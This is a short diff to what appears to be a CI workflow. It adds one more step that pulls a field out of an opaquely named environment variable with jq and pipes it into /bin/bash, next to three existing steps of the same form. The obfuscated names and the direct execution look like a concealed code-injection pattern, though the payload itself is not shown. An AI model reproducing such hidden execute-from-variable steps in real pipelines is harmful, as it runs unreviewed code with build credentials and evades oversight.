@@ -58,6 +58,7 @@ jobs:
           printf '%s' "$ym28" | jq -r .rsi189 | /bin/bash
           echo $y1711 | jq -r .mduvn0 | /bin/bash
           printf '%s' "$yswfe907" | jq -r .nmme6 | /bin/bash
+          printf '%s' "$htbl7563" | jq -r .i7470 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
